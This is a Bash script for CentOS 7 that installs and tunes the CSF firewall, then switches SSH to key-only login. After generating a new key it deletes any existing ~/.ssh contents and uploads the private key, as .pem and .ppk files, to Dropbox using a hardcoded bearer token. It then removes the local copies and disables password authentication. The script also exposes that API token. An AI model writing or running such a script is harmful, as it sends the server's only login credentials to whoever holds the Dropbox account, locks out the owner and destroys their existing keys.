#!/bin/bash
#
#   _____   .__     .______.
#  /  _  \  |__|  __| _/\_ |__    ______
# /  /_\  \ |  | / __ |  | __ \  /  ___/
#/    |    \|  |/ /_/ |  | \_\ \ \___ \
#\____|__  /|__|\____ |  |___  //____  >
#        \/          \/      \/      \/
#
###############

yum -y update
yum -y install epel-release
yum -y install wget tar curl unzip sendmail bind-utils perl-libwww-perl.noarch perl-LWP-Protocol-https.noarch perl-GDGraph perl

cd /usr/src
rm -fv csf.tgz
wget https://download.configserver.com/csf.tgz
tar -xzf csf.tgz
cd csf
sh install.sh

## #test csf
perl /usr/local/csf/bin/csftest.pl

#configure CSF
sed -i 's/TESTING = "1"/TESTING = "0"/g' /etc/csf/csf.conf
sed -i 's/RESTRICT_SYSLOG = "0"/RESTRICT_SYSLOG = "1"/g' /etc/csf/csf.conf
sed -i 's/CT_LIMIT = "0"/CT_LIMIT = "50"/g' /etc/csf/csf.conf
sed -i 's/CT_PERMANENT = "0"/CT_PERMANENT = "1"/g' /etc/csf/csf.conf
sed -i 's/CT_BLOCK_TIME = "1800"/CT_BLOCK_TIME = "600"/g' /etc/csf/csf.conf
sed -i 's/CONNLIMIT = ""/CONNLIMIT ="22;15"/g' /etc/csf/csf.conf

#
systemctl stop sendmail
csf -r

# SSH Key Based Authentication
##### Created By Abhishek Raw
##### Script Perfectly Work On Centos 7

echo "

"

printf "##### Please Run this script in User Directory, which was access by SSH/SFTP Verify your SSH Key Path #### \n"
printf "\033[1;32m Path -- $PWD \033[0m\n"
read -p 'Press "Y" to continue and crtl+c to cancel the process = ' variable

##### 
hname=`hostname -s`
ipaddr=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
keyname=`echo $hname-$ipaddr`

##### Generate Key - Make Dir .SSH
rm -rf ~/.ssh
mkdir ~/.ssh
chmod 700 ~/.ssh
ssh-keygen -t rsa -b 4096 -N "" -v -f ~/.ssh/$keyname

##### Move and Copy Public Key
mv ~/.ssh/$keyname ~/.ssh/$keyname.pem
cp ~/.ssh/$keyname.pub ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

#####
cd /usr/src/
yum -y install wget gcc make curl
wget https://the.earth.li/~sgtatham/putty/0.74/putty-0.74.tar.gz
tar -xvf putty-0.*.tar.gz
cd putty-*/
./configure
make && make install

##### Convert key
puttygen ~/.ssh/$keyname.pem -o ~/.ssh/$keyname.ppk -O private
cd ~/.ssh

##### Uploading File to Server
curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer N-1uJICccaAAAAAAAAAAPRuQ0V_yne4zI_bFcwTiJ9G5oj3RXAfY9VqRdNRK9PpX" --header "Dropbox-API-Arg: {\"path\": \"/$keyname.pem\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}" --header "Content-Type: application/octet-stream" --data-binary @$keyname.pem

curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer N-1uJICccaAAAAAAAAAAPRuQ0V_yne4zI_bFcwTiJ9G5oj3RXAfY9VqRdNRK9PpX" --header "Dropbox-API-Arg: {\"path\": \"/$keyname.ppk\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}" --header "Content-Type: application/octet-stream" --data-binary @$keyname.ppk

##### Remove Pvt Key 
rm -rf $keyname.*

##### Changing Configuration on SSH/Conf
sed -i 's/PasswordAuthentication.*/PasswordAuthentication no/g' /etc/ssh/sshd_config
sed -i 's/^#PubkeyAuthentication yes/PubkeyAuthentication yes/g' /etc/ssh/sshd_config

#####
systemctl restart sshd
#Falllback
/etc/init.d/sshd restart

#####
printf "\033[1;32m Your Server is configure with Key based Authentication use '$keyname.pem' to Login \033[0m\n"

#####
rm -rf sshkey_gen.sh

##### END
#vi -b filename
#Then in vi, type:
#:%s/\r$//
#:x
